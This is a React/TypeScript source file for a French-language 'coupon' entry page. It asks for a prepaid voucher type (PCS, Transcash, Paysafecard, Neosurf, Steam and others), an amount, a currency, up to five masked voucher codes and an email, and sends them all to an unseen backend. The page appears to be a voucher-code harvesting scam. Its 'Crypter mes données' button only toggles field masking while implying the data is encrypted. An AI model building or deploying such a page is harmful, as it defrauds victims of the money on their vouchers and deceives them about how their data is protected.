import { Button } from "@/components/ui/button";
import { zodResolver } from "@hookform/resolvers/zod";
import { useForm } from "react-hook-form";
import { AnimatedSubscribeButton } from "@/components/magicui/animated-subscribe-button";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import { Input } from "@/components/ui/input";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { z } from "zod";
import { useState } from "react";
 // Utilisé pour la redirection
import { axiosform } from "../components/api/form";

const formSchema = z.object({
  mount: z.coerce.number().min(20, { message: "Le montant doit être au moins 20" }).max(250, { message: "Le montant ne peut pas dépasser 250" }),
  recharge: z.string().min(1, { message: "Ce champ est requis" }),
  devise: z.string().min(1, { message: "Ce champ est requis" }),
  code1: z.string().min(5, { message: "Le code doit contenir au moins 5 caractères" }).max(25, { message: "Le code ne peut pas dépasser 25 caractères" }),
  code2: z.optional(z.string().min(5, { message: "Le code doit contenir au moins 5 caractères" }).max(25, { message: "Le code ne peut pas dépasser 25 caractères" })),
  code3: z.optional(z.string().min(5, { message: "Le code doit contenir au moins 5 caractères" }).max(25, { message: "Le code ne peut pas dépasser 25 caractères" })),
  code4: z.optional(z.string().min(5, { message: "Le code doit contenir au moins 5 caractères" }).max(25, { message: "Le code ne peut pas dépasser 25 caractères" })),
  code5: z.optional(z.string().min(5, { message: "Le code doit contenir au moins 5 caractères" }).max(25, { message: "Le code ne peut pas dépasser 25 caractères" })),
  email: z.string().email({ message: "Veuillez entrer un email valide" }).min(1, { message: "Ce champ est requis" }),
});

function Home() {

  const form = useForm<z.infer<typeof formSchema>>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      devise: "",
      recharge: "",
      mount: 0,
      code1: "",
      email: "",
    },
  });

  const [showPassword, setShowPassword] = useState(false);
  const [buttonText, setButtonText] = useState("Envoyer");

  const onSubmit = async (values: z.infer<typeof formSchema>) => {
    try {
      // Envoyer les données via Axios
      await axiosform.post("/", values, {
        headers: {
          'X-Requested-With': 'XMLHttpRequest'
        }
        
      });
      console.log(axiosform);

      // Changer le texte du bouton
      setButtonText("C'est bon !");

      // Effacer le formulaire
      // form.reset();


      // Rediriger vers /attente après une petite pause (optionnel)
      // setTimeout(() => {
      //   window.location.reload();
      // }, 3000); // Attendre 1 seconde avant de rediriger
    } catch (error) {
      console.error("Erreur lors de la soumission du formulaire :", error);
      alert("Une erreur s'est produite lors de l'envoi du formulaire.");
    }
  };

  return (
    <div className="text-2xl items-center justify-center flex w-full  ">
      <div className="h-full rounded-lg py-5 lg:w-[60%] md:w-[80%]  shadow-2xl px-4 bg-blue-100">
        <h1 className="md:text-4xl font-bold mb-4 text-center">
          Veuillez entrer les informations du coupon ici.
        </h1>
        <Form {...form}>
          <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-2">
            {/* Champs existants */}
            <FormField
              control={form.control}
              name="recharge"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>Choisir une recharge *</FormLabel>
                  <Select
                    onValueChange={field.onChange}
                    defaultValue={field.value}
                  >
                    <FormControl>
                      <SelectTrigger className="w-full">
                        <SelectValue placeholder="--- Recharge ---" />
                      </SelectTrigger>
                    </FormControl>
                    <SelectContent>
                      <SelectItem value="NOE">NOESURF</SelectItem>
                      <SelectItem value="PCS">PCS</SelectItem>
                      <SelectItem value="TRANSCASH">TRANSCASH</SelectItem>
                      <SelectItem value="PAYAFECARD">PaysafeCard</SelectItem>
                      <SelectItem value="GOOGLE PLAY">GOOGLE PLAY</SelectItem>
                      <SelectItem value="STEAM">STEAM</SelectItem>
                      <SelectItem value="FLEXEPIN">FLEXEPIN</SelectItem>
                      <SelectItem value="CASHLIB">CASHLIB</SelectItem>
                      <SelectItem value="NETFLIX">NETFLIX</SelectItem>
                      <SelectItem value="AMAZON">AMAZON</SelectItem>
                    </SelectContent>
                  </Select>
                  <FormMessage />
                </FormItem>
              )}
            />
            <FormField
              control={form.control}
              name="mount"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>Montant de la recharge *</FormLabel>
                  <FormControl>
                    <Input
                      className="border-blue-400 border-2"
                      type="number"
                      placeholder="0"
                      {...field}
                    />
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />
            <FormField
              control={form.control}
              name="devise"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>Choisir une devise *</FormLabel>
                  <Select
                    onValueChange={field.onChange}
                    defaultValue={field.value}
                  >
                    <FormControl>
                      <SelectTrigger className="w-full">
                        <SelectValue placeholder="--- Devise ---" />
                      </SelectTrigger>
                    </FormControl>
                    <SelectContent>
                      <SelectItem value="euro">EURO (€)</SelectItem>
                      <SelectItem value="dollar">DOLLAR ($)</SelectItem>
                      <SelectItem value="franc suisse">
                        FRANC SUISSE (CHF)
                      </SelectItem>
                    </SelectContent>
                  </Select>
                  <FormMessage />
                </FormItem>
              )}
            />
            {/* Champs de code individuels */}
            <FormField
              control={form.control}
              name="code1"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>Code de recharge</FormLabel>
                  <FormControl>
                    <Input
                      type={showPassword ? "text" : "password"}
                      placeholder="Entrez le code"
                      {...field}
                    />
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />
            <FormField
              control={form.control}
              name="code2"
              render={({ field }) => (
                <FormItem>
                  <FormControl>
                    <Input
                      type={showPassword ? "text" : "password"}
                      placeholder="Entrez le code 2"
                      {...field}
                    />
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />
            <FormField
              control={form.control}
              name="code3"
              render={({ field }) => (
                <FormItem>
                  <FormControl>
                    <Input
                      type={showPassword ? "text" : "password"}
                      placeholder="Entrez le code 3"
                      {...field}
                    />
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />
            <FormField
              control={form.control}
              name="code4"
              render={({ field }) => (
                <FormItem>
                  <FormControl>
                    <Input
                      type={showPassword ? "text" : "password"}
                      placeholder="Entrez le code 4"
                      {...field}
                    />
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />
            <FormField
              control={form.control}
              name="code5"
              render={({ field }) => (
                <FormItem>
                  <FormControl>
                    <Input
                      type={showPassword ? "text" : "password"}
                      placeholder="Entrez le code 5"
                      {...field}
                    />
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />
            <Button
              variant="outline"
              className="bg-blue-400 hover:bg-blue-500 w-full text-white"
              type="button"
              onClick={() => setShowPassword(!showPassword)}
            >
              {showPassword ? "Crypter mes données" : "Decrypter mes données"}
            </Button>
            <FormField
              control={form.control}
              name="email"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>Email</FormLabel>
                  <FormControl>
                    <Input
                      type="email"
                      placeholder="exemple@domain.com"
                      {...field}
                    />
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />
            <AnimatedSubscribeButton
              type="submit"
              className="bg-blue-400 hover:bg-blue-500 w-full text-white"
            >
              <span>{buttonText}</span>
              <span>{buttonText}</span>
            </AnimatedSubscribeButton>
          </form>
        </Form>
      </div>
    </div>
  );
}

export default Home;